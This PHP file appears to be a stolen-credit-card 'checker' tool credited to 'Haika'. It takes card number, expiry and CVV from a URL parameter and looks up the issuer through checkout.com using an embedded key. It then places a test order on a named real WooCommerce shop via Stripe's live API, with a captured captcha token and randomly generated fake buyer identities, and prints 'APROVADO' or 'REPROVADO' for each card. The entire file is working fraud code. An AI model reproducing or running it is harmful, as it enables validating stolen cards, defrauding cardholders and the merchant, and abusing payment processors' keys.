<?php

// Api By Haika <3

error_reporting(0);

$get = $_GET['lista'];
$explode = explode("|", $get);
[$cc, $mes, $ano, $cvv] = $explode;

function getStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}

function GenerateUsers(){
    $rand = rand(10, 10000000000);
    $names = ['haika', 'kelly', 'jessica', 'lucas', 'joao', 'maria', 'pedro', 'ana', 'carlos', 'julia', 'fernanda', 'gabriel', 'isabela', 'henrique', 'lara', 'matheus', 'natalia', 'olivia', 'pedro', 'queiroz', 'rebecca', 'samuel', 'thais', 'vinicius', 'yasmin', 'zoe'];
    $sub_names = ['silva', 'franco', 'santos', 'oliveira', 'rodrigues', 'sousa', 'lima', 'gomes', 'ferreira', 'sousa', 'rodrigues', 'sousa', 'lima', 'gomes', 'ferreira', 'sousa', 'rodrigues', 'sousa', 'lima', 'gomes', 'ferreira', 'sousa', 'rodrigues', 'sousa', 'lima', 'gomes', 'ferreira', 'sousa', 'rodrigues', 'sousa', 'lima', 'gomes', 'ferreira'];
    $name = $names[rand(0, count($names) - 1)];
    $sub_name = $sub_names[rand(0, count($sub_names) - 1)];
    $name_full = "$name$sub_name";
    $email = $name.$rand.'@gmail.com';

    return [
        'email' => $email,
        'name_full' => $name_full,
        'name' => $name,
        'sub_name' => $sub_name
    ];
}

if(empty($cc) || empty($mes) || empty($ano) || empty($cvv)){
    echo '<span class="badge badge-danger">🧨 # ERRO </span> » ['.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'] » ['.$informacoes.'] » <span class="badge badge-danger">[Erro Interno] @Haika</span><br>';
    exit();
} if (strlen($cc) != 16 || strlen($mes) != 2 || strlen($ano) != 4 || strlen($cvv) != 3){
    echo '<span class="badge badge-danger">🧨 # ERRO </span> » ['.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'] » ['.$informacoes.'] » <span class="badge badge-danger">[Erro Interno] @Haika</span><br>';
    exit();
} if (!is_numeric($cc) || !is_numeric($mes) || !is_numeric($ano) || !is_numeric($cvv)){
    echo '<span class="badge badge-danger">🧨 # ERRO </span> » ['.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'] » ['.$informacoes.'] » <span class="badge badge-danger">[Erro Interno] @Haika</span><br>';
    exit();
}


$users = GenerateUsers();
$cookiecount = "woo_".rand(10, 10000000000)."";

$c = curl_init();
curl_setopt($c, CURLOPT_URL, "https://api.checkout.com/tokens");
curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($c, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($c, CURLOPT_HTTPHEADER, array(
'accept: */*',
'authorization: pk_wf64cebluwwe46fsf7fgb3l5umk',
'content-type: application/json',
'origin: https://js.checkout.com',
'referer: https://js.checkout.com/',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 OPR/98.0.0.0'));
curl_setopt($c, CURLOPT_POSTFIELDS, '{"type":"card","number":"'.$cc.'","expiry_month":11,"expiry_year":2028,"cvv":"483","name":"haikarajadas Regina","billing_address":{"address_line1":"Haikara Izakaya","city":"Paris","state":"IDF","zip":"75011","country":"FR"},"phone":{"number":"5519996831732"},"preferred_scheme":"","requestSource":"JS"}');
$puxarbins = curl_exec($c);
$pais = getStr($puxarbins, '"issuer_country":"','",');
$bandeira = getStr($puxarbins, '"scheme":"','",');
$tipo = getStr($puxarbins, '"card_type":"','",');
$nivel = getStr($puxarbins, '"product_type":"','"');
$banco = getStr($puxarbins, '"issuer":"','",');
$INFO = "$bandeira $banco $tipo $nivel ($pais)";
$informacoes = strtolower($INFO);

$c = curl_init();
curl_setopt($c, CURLOPT_URL, 'https://smoothitalia.com/?wc-ajax=add_to_cart');
curl_setopt($c, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($c, CURLOPT_COOKIEJAR, getcwd()."/$cookiecount.txt");
curl_setopt($c, CURLOPT_COOKIEFILE, getcwd()."/$cookiecount.txt");
curl_setopt($c, CURLOPT_HTTPHEADER, array(
'accept: application/json, text/javascript, */*; q=0.01',
'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'origin: https://smoothitalia.com',
'referer: https://smoothitalia.com/shop/accessories/carhartt-wip-cuban-link-keychain-gold-i034580_3k_xx/',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
'x-requested-with: XMLHttpRequest',
));
curl_setopt($c, CURLOPT_POSTFIELDS, 'product_id=128142&quantity=1');
$add_cart = curl_exec($c);

$c = curl_init();
curl_setopt($c, CURLOPT_URL, 'https://smoothitalia.com/checkout/');
curl_setopt($c, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($c, CURLOPT_COOKIEJAR, getcwd()."/$cookiecount.txt");
curl_setopt($c, CURLOPT_COOKIEFILE, getcwd()."/$cookiecount.txt");
curl_setopt($c, CURLOPT_HTTPHEADER, array(
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' ,
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
));
$checkout = curl_exec($c);

$email = $users['email'];
$nome = $users['name'];
$sub_nome = $users['sub_name'];

$nonce = getStr($checkout, 'name="woocommerce-process-checkout-nonce" value="','"');

$c = curl_init();
curl_setopt($c, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($c, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($c, CURLOPT_HTTPHEADER, array(
'accept: application/json',
'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
));
curl_setopt($c, CURLOPT_POSTFIELDS, 'type=card&billing_details[address][line1]=12&billing_details[address][line2]=cxc&billing_details[address][country]=BR&billing_details[address][city]=sdasd&billing_details[address][postal_code]=01451-'.rand(123, 340).'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.substr($ano, -2).'&guid=d8e0416f-c5b1-4142-8602-3ab095246fe1edef4c&muid=f6fefe3a-8fda-4dca-889a-a5d98aabeff6a31930&sid=83395d7e-80c9-4f4b-8dd5-40bbfca0692d901b3a&pasted_fields=number%2Ccvc&payment_user_agent=stripe.js%2Fa8d5dc1378%3B+stripe-js-v3%2Fa8d5dc1378%3B+split-card-element&referrer=https%3A%2F%2Fsmoothitalia.com&time_on_page=84996&key=pk_live_hRjaP3LPE1e1nmsxhD6h5nTD&_stripe_version=2022-08-01&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiSW5kb2xuaDR0ak5nYUUybVF1WUptMXhhbzNXdklqcVovYkNFV1FLU0VqOW1kbXBveDh4bVhTUTFXV21iS1A0dUZqVmk4a3NZTThKVlRyZ1VYQWlBdTV2UHVMQWoxcHZZMTVIdWh6MkNGMzFjSk5sb25JeFJ0cXBrWTllcnB2ZU96TWdwUjM4dEs4Tk5helFzWWtQckQzRGx2Q3UxWm8xMndkOFdoVWxvQ0xFb3RBeVlYT1kxV1NOempxcG5IYlA1MzBlYUZBYk5XdGFiMVZpb1pLQkcrVTZKV29laGVoVXlkR3VhWG9JNTZoYWJ6ZS9NQU52UlNZVVFOOHJ2R0hvT3dOa0JxUVJ0MWJ3NVUxbmdBSW9Ta0NhVis0Z3BGQlJwb00yT2NmTElacHIyLzhVaVFnZTJEZkVBTFRxU1J6Yks4bkM3eVh6dDd6dE1yUTZMZVRzL1hjZndzTkZwdmYyQWh6RUJ2aDBWaXoyUytmc21mejR3K2pGZ2VvWUl0VFRZMHd0V05CUWQzSVVLVWdEQitNZUVVWFB4L0wvY2crdjdtSTlOWHdkdVY3a2lUc0Y5ZkhEM01WNzFQcEhncHNrRGMvU1RLMXB5SDVGRWFuMEdyYTNQUUNnOFV3dHJkNndYL2pKeXQ4dUJOdmVta25NVmVuUmxRcG1SU2x0VFZ4ek9laTRtbHNSVUtHTEpMUC9CckV4UDBYTEx4NGo2djVqWU9xTHNodnA2VGk3VGZTVWYweXl0QWMzSUE1RVlHVnVMeUppNlhnK3EwRGhOUEx3dDJEUzZ2RldjMk14T010bWNEbHVzTkFadkI3S2xuUHQ0YVdvbzljRWtTU1gyMStnQk5pNDRBMlZNLzlNZE03QWljenZnc3VUWHlPZ2FkMFlXMmVwVjhNS3JlNEdCNWEvUHJSNmxnYkl2KzZDZnZtS214U1Z2Q29oVE5MY2NRdGdoMFJFMFArN3FucXFPeTNFT2xEQ3hoRGh2aldPVVdxbHJRSGswbXVESTk5cFNyNjB2TDVNZkJwSlFFVkV1cEZxMFVUcVhKWWVMRG9SZU9aUHFpVTU4UFJaYWpsQWhsWU9pUkFnVUtOZlVNSkE3TUFQRkM1dEVGN2drZEczSnovMGFLcGpsc1pkY0dwNTB6bUx6MUJoYUUrL0QyWmJ1eTdZb1dvRmJFTWNtNzg0dVFJSExjbmdPZVVqdldDcEFBVVRYUExIT1gzUzMxMkt5ZXhyTHZhVGI4S3dmWXNsbWtjUCtleVpsaDAvQVJEZnBybUVuS1lJcXZRdW0vdjlQcEJFUnE1Ky9kY05kdVZ6YWJ4T3FncXFDMlp2T1FEM1NOUCtTMFp4YVlxYlFvc3ZBSTNVeFBtdks0ZXcvaER5K1lmK3I4RCttendsUkw3Mm9rUVdHWUhtcm5PU2VjcWhJcmlXc1pUOExrSkV1aXZYdHZyUGYrcklIN1BXc3BqNVRJRjdLSTZBOU4rUk1ITGROa0o2WTNTNmhLTkVRenBlMHRnemRTT1NDSDVwZmxzOHhaNitiZ1pjS1krcDFheVd6ZThTenV4c3d2RmlXMnlGWDhQVnF4SlVBb2tzR2M4MUptS3FjVExMWXhMSlpVK1J6OWdhS2VjNDBrRnhtZDFDMG5jTXcrYjJFV2tUd1V2OW5UQlpMM2ZhQXArdlZaZzFkT25ySGNkcEJaQTFsNnhaSXRyNU95eWdRekdxTFZnQlp2ckMxeE1vK0xxQm9ERFdyNHZNdWl2TWdrZ0x5S0dTTDJNb2x5bEplWmNaOWdzc1g1b3lFblVJWDd1TXY0dytwWWpycTlhSG5PR2lNSVhDL1NxclBMam5CWmpVWmsvZVJESHphTDZPTzVwTDRMcGhvYUU5V25vbWZzK1g1YnErOGV4bmIzcWxMVXp6bGx4ZXQwNmE4dmFhUmMzWVNqMi9rK3hkZG9LbE54NWxKS2w4V1FEL3NhUmFVSFdLa3dzRkhGSXZNaDU1Y1Y1a2xURXBqcTh1Y1BGQTNKaERIeW1ENU1GenNyczhxaHVIRVhSdWVBT2hKT3oySmVTMjcwSjdkWDlIKytZS2svMmhQNUVlL1BjTWorVXRuc3BDS2FOb3ZoK0M2RjB4amg1RU4wQzAwZGFhaHM1UmxzVU5pWk5jcGpVN1FyTFY0RzRwcDhqbmEwTzZwdGxXZXlUK0FnNVJBNDRrNDNPbzRxeDFwNkRjSVI1ZWxLNWF1U016MC9vZUJyYzgyRWxZOWFBUldQOE5RSnZucmFXTVJLUlJwcHBQKy8zNjZHLzd4amp0M1FXaHlSdWs4dUpFdDJzRUhXKzl2UVhaL2pMMllISzlFSWROaEtEaTgrSmZHK3hraG1TQ1YyZTV6blR2UkxuYXlpZGFEMHpPTmxyVWlwT2ZvV1g4Yk9nVVpsMzB3cWhqWHREZDZQR2ZDYjRlNW90VXBNRm1PWlBncURJUFBXZWJ4Tm50TlZFL2pPcVdtVkZjWHgwNEtDVkZMRTN6aTBQMERRbnZJWkEwYUpxVHhmMEZpMk1ZUFM0cFB5YkFXSzJnb0M5Wmpudk9YaEZTdUIzZ28wQmJhVjE2NEJ4THZMdlExQ2JsQnc4Z0t3Nk03NTdzSzBLTUpEb1E2TnB1RkdVaGJDSHZ1Uk8zVXlZSkNRclJnakowNzJNNCtseGxRcEpudkpDQy9hZkF5dnE5dktsa210ZzhKVitDUUltcmFvMUFSRDhINXpvOUl3WXRJWWI0dVdiNG1ZRS93Q3BtR2NnMkRXSW55OWYxWEVIamtwNTBMNEEyaGphTTh2TlVjOVZ3dmZmT2N5UmkrRUlncnNCdUZobzFONUVlN3lsaE82dEpNcDJlYW1NS0xObHV2ZFNiSCttYWpNeGdZa2N4LyIsImV4cCI6MTczNjgwNzA2Mywic2hhcmRfaWQiOjcxNzcxNTM3LCJrciI6IjFjYWJmZjFhIiwicGQiOjAsImNkYXRhIjoiOGl5NFZXSitCQ3pFOFNsQUZOelM5cVI1R0c0L0lUelZUQnVoZld5UW0zMGE1d3k5UldUQ3Fvd3k4ZjZPQXVydXovRTJEZm0yUmhvRTRGa0hUTWtSZWVFSERtYXdIbTZROWx4aFhSMTdaQnNodzlSMU5GaWlHYktKb1VrcWVZM2RSYXc5ZHpTeEJSbUxreHkxSmZkaE84K2RwTkpMZCswVDFOTnF1T1NPWDR6ZkxpWlB5NGEvNFFObURWWWtJbmxoNmpZTDBQeVA0STd1VmtreSJ9.U7CHxwhXBFjlscThy4plEg8goHS_LRq0JcmVHpk24FU');
$stripe = curl_exec($c);

$json = json_decode($stripe, true);
$id = $json['id'];
$brand = $json['card']['brand'];

if(!$id){
    $message = $json['error']['message'];
    echo '<span class="badge badge-danger">🧨 # REPROVADO </span> » ['.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'] » ['.$informacoes.'] » <span class="badge badge-danger">['.$message.'] @Haika</span><br>';
    exit();
}

$c = curl_init();
curl_setopt($c, CURLOPT_URL, 'https://smoothitalia.com/?wc-ajax=checkout');
curl_setopt($c, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($c, CURLOPT_COOKIEJAR, getcwd()."/$cookiecount.txt");
curl_setopt($c, CURLOPT_COOKIEFILE, getcwd()."/$cookiecount.txt");
curl_setopt($c, CURLOPT_HTTPHEADER, array(
'accept: application/json, text/javascript, */*; q=0.01' ,
'content-type: application/x-www-form-urlencoded; charset=UTF-8' ,
'origin: hhttps://smoothitalia.com' ,
'referer: https://smoothitalia.com/finalizar-compra/' ,
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36' ,
'x-requested-with: XMLHttpRequest'
));
curl_setopt($c, CURLOPT_POSTFIELDS, 'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fsmoothitalia.com%2Fcategoria-prodotto%2Fcarhartt-wip-shop-online%2Fpage%2F33%2F&wc_order_attribution_session_start_time=2025-01-13+22%3A16%3A19&wc_order_attribution_session_pages=13&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F131.0.0.0+Safari%2F537.36+Edg%2F131.0.0.0&billing_first_name='.$nome.'&billing_last_name='.$sub_nome.'&billing_company=xzcasdasd&billing_country=BR&billing_address_1=12&billing_address_2=cxc&billing_city=sdasd&billing_state=AC&billing_postcode=01451-001&billing_phone=%2B5519998128237&billing_email='.urlencode($email).'&account_username=&account_password=&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=BR&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=&shipping_postcode=&order_comments=&shipping_method%5B0%5D=betrs_shipping%3A8-1&payment_method=eh_stripe_pay&paypal_credit_card_rest-card-number=&paypal_credit_card_rest-card-expiry=&paypal_credit_card_rest-card-cvc=&terms=on&terms-field=1&woocommerce-process-checkout-nonce='.$nonce.'&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&eh_stripe_pay_amount=2900&eh_stripe_pay_token='.$id.'&eh_stripe_pay_currency=eur&eh_stripe_pay_amount=7890&eh_stripe_card_type='.$brand.'');
$f = curl_exec($c);

if (stripos($f, 'redirect')){
  echo '<span class="badge badge-success">✅ # APROVADO </span> » ['.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'] » ['.$informacoes.'] » <span class="badge badge-success">[Pagamento Aprovado!] @Haika </span><br>';
}elseif (stripos($f, 'result":"failure')){
   $message = getStr($f, '"messages":"\n<ul class=\"woocommerce-error\" role=\"alert\">\n\t\t\t<li>\n\t\t\t','\t\t<\/li>\n\t<\/ul>\n');
   echo '<span class="badge badge-danger">🧨 # REPROVADO </span> » ['.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'] » ['.$informacoes.'] » <span class="badge badge-danger">['.$message.'] @Haika</span><br>';
}else {
    echo '<span class="badge badge-warning">🧨 # ERRO </span> » ['.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'] » ['.$informacoes.'] » <span class="badge badge-warning">[Erro ao processar pagamento] @Haika</span><br>';
}

if (file_exists(getcwd()."/$cookiecount.txt")){
    unlink(getcwd()."/$cookiecount.txt");
}

?>
